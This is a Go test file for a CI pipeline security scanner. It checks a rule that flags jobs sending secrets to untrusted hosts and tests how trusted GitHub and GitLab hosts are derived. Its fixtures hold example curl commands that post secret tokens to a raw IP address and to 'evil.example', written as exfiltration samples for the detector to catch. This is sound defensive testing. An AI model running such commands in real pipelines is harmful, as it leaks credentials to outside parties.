package control

import (
	"context"
	"strings"
	"testing"

	"github.com/getplumber/plumber/configuration"
	opaengine "github.com/getplumber/plumber/internal/engine/opa"
	"github.com/getplumber/plumber/internal/ir"
	"github.com/getplumber/plumber/policies"
)

// Pins the struct -> map -> rego chain for ISSUE-311 and the VCS host
// projection: the rego reads exactly input.config.secretEgress.{trustVcsHosts,
// trustedHosts, vcsHosts}. Mirrors TestMRApprovalMinApprovalsConfigContract.
func TestSecretEgressConfigContract(t *testing.T) {
	boolPtr := func(b bool) *bool { return &b }
	engine := opaengine.New()
	if err := engine.LoadFromFSFiltered(policies.FS, nil); err != nil {
		t.Fatalf("load policies: %v", err)
	}
	count := func(pipeline *ir.NormalizedPipeline, cfg map[string]any) int {
		findings, err := evaluateStrict(engine, context.Background(), pipeline, cfg)
		if err != nil {
			t.Fatalf("evaluate: %v", err)
		}
		n := 0
		for _, f := range findings {
			if f.Code == "ISSUE-311" {
				n++
			}
		}
		return n
	}
	github := &ir.NormalizedPipeline{Provider: ir.ProviderGitHub, Jobs: []ir.Job{{
		Name:    "wf/send",
		Scripts: []string{`curl -d 'k=${{ secrets.KEY }}' https://api.github.com/x`, `curl -d 'k=${{ secrets.KEY }}' http://193.32.204.199`},
	}}}
	gitlab := &ir.NormalizedPipeline{Provider: ir.ProviderGitLab, SettingsVariablesKnown: true,
		SettingsVariables: []ir.SettingsVariable{{Name: "TOK", Type: "env_var", Environment: "*", Masked: true}},
		Jobs:              []ir.Job{{Name: "leak", Scripts: []string{`curl -d "k=$TOK" https://registry.gitlab.example.com/v2/`, `curl -d "k=$TOK" https://evil.example/`}}}}

	// Defaults through the real projection: VCS hosts trusted, the IP and the
	// foreign host fire, one finding each.
	cfg := buildEngineConfigForRun(&configuration.ControlsConfig{
		PipelineMustNotSendSecretsToUntrustedHosts: &configuration.SecretEgressControlConfig{Enabled: boolPtr(true)},
	}, "github", "")
	block, ok := cfg["secretEgress"].(map[string]any)
	if !ok {
		t.Fatal("no secretEgress block projected")
	}
	if block["trustVcsHosts"] != true {
		t.Fatalf("trustVcsHosts default = %v, want true", block["trustVcsHosts"])
	}
	if n := count(github, cfg); n != 1 {
		t.Fatalf("github defaults: %d findings, want 1 (the IP only)", n)
	}
	cfgGL := buildEngineConfigForRun(&configuration.ControlsConfig{
		PipelineMustNotSendSecretsToUntrustedHosts: &configuration.SecretEgressControlConfig{Enabled: boolPtr(true)},
	}, "gitlab", "https://gitlab.example.com")
	hosts := cfgGL["secretEgress"].(map[string]any)["vcsHosts"].([]string)
	if len(hosts) != 2 || hosts[0] != "gitlab.example.com" || hosts[1] != "registry.gitlab.example.com" {
		t.Fatalf("gitlab vcsHosts = %v", hosts)
	}
	if n := count(gitlab, cfgGL); n != 1 {
		t.Fatalf("gitlab defaults: %d findings, want 1 (evil.example only)", n)
	}

	// trustVcsHosts false fires on the VCS host too; trustedHosts silences.
	cfgNoVcs := buildEngineConfigForRun(&configuration.ControlsConfig{
		PipelineMustNotSendSecretsToUntrustedHosts: &configuration.SecretEgressControlConfig{Enabled: boolPtr(true), TrustVcsHosts: boolPtr(false)},
	}, "github", "")
	if n := count(github, cfgNoVcs); n != 2 {
		t.Fatalf("trustVcsHosts=false: %d findings, want 2", n)
	}
	cfgAllow := buildEngineConfigForRun(&configuration.ControlsConfig{
		PipelineMustNotSendSecretsToUntrustedHosts: &configuration.SecretEgressControlConfig{Enabled: boolPtr(true), TrustedHosts: []string{"193.32.*"}},
	}, "github", "")
	if n := count(github, cfgAllow); n != 0 {
		t.Fatalf("trustedHosts glob: %d findings, want 0", n)
	}

	// A disabled or absent block projects nothing, so the rule never runs.
	if _, has := buildEngineConfigForRun(&configuration.ControlsConfig{}, "github", "")["secretEgress"]; has {
		t.Fatal("absent control must not project a block")
	}
	if _, has := buildEngineConfigForRun(&configuration.ControlsConfig{
		PipelineMustNotSendSecretsToUntrustedHosts: &configuration.SecretEgressControlConfig{Enabled: boolPtr(false)},
	}, "github", "")["secretEgress"]; has {
		t.Fatal("disabled control must not project a block")
	}
}

// The GitLab VCS host set derives from the configured instance URL: the
// lower-cased hostname (no port, no path) and its registry; nothing when the
// URL cannot yield a host.
func TestVcsHostsForGitLabURL(t *testing.T) {
	cases := map[string][]string{
		"https://GitLab.Example.com":          {"gitlab.example.com", "registry.gitlab.example.com"},
		"https://gitlab.example.com:8443/gl/": {"gitlab.example.com", "registry.gitlab.example.com"},
		"":                                    {},
		"not a url":                           {},
	}
	for in, want := range cases {
		got := vcsHostsFor(configuration.ProviderGitLab, in)
		if len(got) != len(want) {
			t.Errorf("vcsHostsFor(gitlab, %q) = %v, want %v", in, got, want)
			continue
		}
		for i := range want {
			if got[i] != want[i] {
				t.Errorf("vcsHostsFor(gitlab, %q) = %v, want %v", in, got, want)
			}
		}
	}
}

// The GitHub VCS host set is the fixed public list, plus the instance host
// and its subdomains when the run targets GitHub Enterprise Server. The
// instance arrives as conf.GithubAPIHost: a bare host, a host with the
// /api/v3 path, or a URL; github.com and api.github.com add nothing.
func TestVcsHostsForGitHubInstance(t *testing.T) {
	public := []string{"github.com", "api.github.com", "uploads.github.com", "ghcr.io", "*.githubusercontent.com"}
	ghes := append(append([]string{}, public...), "github.acme-corp.example", "*.github.acme-corp.example")
	cases := map[string][]string{
		"":                                         public,
		"github.com":                               public,
		"api.github.com":                           public,
		"https://api.github.com/":                  public,
		"github.acme-corp.example":                 ghes,
		"github.acme-corp.example/api/v3":          ghes,
		"https://GitHub.Acme-Corp.example/api/v3/": ghes,
		"github.acme-corp.example:8443":            ghes,
	}
	for in, want := range cases {
		got := vcsHostsFor(configuration.ProviderGitHub, in)
		if strings.Join(got, ",") != strings.Join(want, ",") {
			t.Errorf("vcsHostsFor(github, %q) = %v, want %v", in, got, want)
		}
	}
}

// The run hands the engine the instance of the provider it analyses: the
// GitLab URL on GitLab, the GitHub API host on GitHub, so a GHES run trusts
// its own instance.
func TestInstanceURLForRun(t *testing.T) {
	conf := &configuration.Configuration{GitlabURL: "https://gitlab.example.com", GithubAPIHost: "github.acme-corp.example"}
	if got := instanceURLFor(conf, configuration.ProviderGitLab); got != "https://gitlab.example.com" {
		t.Fatalf("gitlab instance = %q", got)
	}
	if got := instanceURLFor(conf, configuration.ProviderGitHub); got != "github.acme-corp.example" {
		t.Fatalf("github instance = %q", got)
	}
	cfg := buildEngineConfigForRun(&configuration.ControlsConfig{
		PipelineMustNotSendSecretsToUntrustedHosts: &configuration.SecretEgressControlConfig{Enabled: func() *bool { b := true; return &b }()},
	}, configuration.ProviderGitHub, instanceURLFor(conf, configuration.ProviderGitHub))
	hosts := cfg["secretEgress"].(map[string]any)["vcsHosts"].([]string)
	if !strings.Contains(strings.Join(hosts, ","), "*.github.acme-corp.example") {
		t.Fatalf("GHES run vcsHosts = %v, want the instance and its subdomains", hosts)
	}
}

// The GitHub stats block counts ISSUE-311 findings, one per finding.
func TestApplyGitHubFindingCountsSecretEgress(t *testing.T) {
	stats := &GitHubAnalysisStats{}
	ApplyGitHubFindingCounts(stats, []opaengine.Finding{
		{Code: string(CodeSecretEgress)}, {Code: string(CodeSecretEgress)}, {Code: "ISSUE-411"},
	})
	if stats.SecretEgressFound != 2 {
		t.Fatalf("SecretEgressFound = %d, want 2", stats.SecretEgressFound)
	}
}
